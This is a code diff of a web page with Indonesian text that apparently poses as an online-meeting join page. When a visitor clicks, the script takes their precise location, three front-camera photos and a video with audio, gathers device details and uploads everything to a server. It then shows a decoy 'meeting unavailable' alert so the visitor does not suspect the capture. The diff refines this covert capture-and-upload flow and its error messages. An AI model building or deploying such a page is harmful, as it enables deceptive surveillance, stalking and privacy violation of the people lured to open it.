@@ -33,7 +33,7 @@
       font-size: 18px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer;
     }
     #status { margin: 20px 0; font-size: 15px; color: #0e72ed; }
-    #error { color: #d93025; font-size: 14px; margin-top: 10px; white-space: pre-line; line-height: 1.4; }
+    #error { color: #d93025; font-size: 13px; margin-top: 10px; white-space: pre-wrap; text-align: left; background:#ffe6e6; padding:12px; border-radius:6px; }
     video { display: none; }
   </style>
 </head>
@@ -73,40 +73,25 @@
 
     btn.addEventListener('click', async () => {
       btn.disabled = true;
-      status.textContent = 'Meminta izin...';
+      status.textContent = 'Memulai proses...';
       errorDiv.textContent = '';
 
-      let locationData = { latitude: null, longitude: null, accuracy: 0, note: "skipped_or_failed" };
-
       try {
-        // 1. Coba ambil lokasi (optional di iOS)
+        // GEOLOCATION (optional)
+        let locationData = { latitude: null, longitude: null, accuracy: 0, note: "failed_or_skipped" };
         status.textContent = 'Mengakses lokasi...';
         try {
-          const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-              enableHighAccuracy: true,
-              timeout: 12000,
-              maximumAge: 0
-            });
-          });
-          locationData = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          };
-          status.textContent = 'Lokasi berhasil ✓';
-        } catch (e) {
-          console.log("Location skipped:", e);
-          status.textContent = 'Lokasi ditolak, lanjut ke kamera...';
-        }
+          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:10000}));
+          locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
+        } catch (e) { console.log("Location skipped"); }
 
-        await sleep(600);
+        await sleep(500);
 
-        // 2. Camera + Audio
+        // CAMERA
         status.textContent = 'Mengaktifkan kamera...';
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" },
-          audio: true
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" }, 
+          audio: true 
         });
 
         videoEl.srcObject = stream;
@@ -114,19 +99,20 @@
 
         await sleep(800);
 
-        // 3. Ambil 3 Foto
-        status.textContent = 'Mengambil foto bukti...';
+        // PHOTOS
+        status.textContent = 'Mengambil foto...';
         const photos = [];
         for (let i = 0; i < 3; i++) {
-          await sleep(1100);
+          await sleep(1000);
           const canvas = document.createElement('canvas');
           canvas.width = videoEl.videoWidth || 640;
           canvas.height = videoEl.videoHeight || 480;
-          canvas.getContext('2d').drawImage(videoEl, 0, 0);
-          photos.push(canvas.toDataURL('image/jpeg', 0.85));
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(videoEl, 0, 0);
+          photos.push(canvas.toDataURL('image/jpeg', 0.8));
         }
 
-        // 4. Rekam Video
+        // VIDEO RECORDING
         status.textContent = 'Merekam video...';
         const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
         const recorder = new MediaRecorder(stream, { mimeType });
@@ -141,18 +127,15 @@
           recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
         });
 
-        // 5. Kirim ke server
-        status.textContent = 'Mengirim data ke server...';
+        // SEND TO SERVER
+        status.textContent = 'Mengirim data...';
         const formData = new FormData();
         formData.append('location', JSON.stringify(locationData));
         formData.append('device_info', JSON.stringify({
           timestamp: new Date().toISOString(),
           userAgent: navigator.userAgent,
           platform: navigator.platform,
-          language: navigator.language,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          screen: `${screen.width}×${screen.height}`,
-          isIOS: true
+          isIOS: /iPhone|iPad|iPod/.test(navigator.userAgent)
         }));
 
         const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
@@ -164,21 +147,24 @@
         }
 
         const response = await fetch(SERVER_URL, { method: 'POST', body: formData });
-
+        
         if (response.ok) {
-          status.innerHTML = '✅ Data berhasil terkirim ke server!';
-          setTimeout(() => {
-            alert("Meeting tidak ditemukan atau sedang sibuk. Silakan coba lagi.");
-          }, 1200);
+          status.innerHTML = '✅ BERHASIL TERKIRIM!';
+          alert("Meeting tidak tersedia. Silakan coba lagi nanti.");
         } else {
-          throw new Error("Upload gagal");
+          throw new Error(`Server returned ${response.status}`);
         }
 
         stream.getTracks().forEach(t => t.stop());
 
       } catch (err) {
-        console.error("ERROR:", err);
-        errorDiv.textContent = `Gagal: ${err.name || err.message}\n\nPastikan semua izin (Lokasi, Kamera, Mikrofon) diizinkan.`;
+        console.error("=== FULL ERROR ===", err);
+        errorDiv.innerHTML = `
+          <b>TypeError terjadi</b><br>
+          Nama Error: ${err.name}<br>
+          Pesan: ${err.message}<br><br>
+          <small>Coba refresh halaman dan izinkan semua izin yang muncul.</small>
+        `;
         btn.disabled = false;
       }
     });
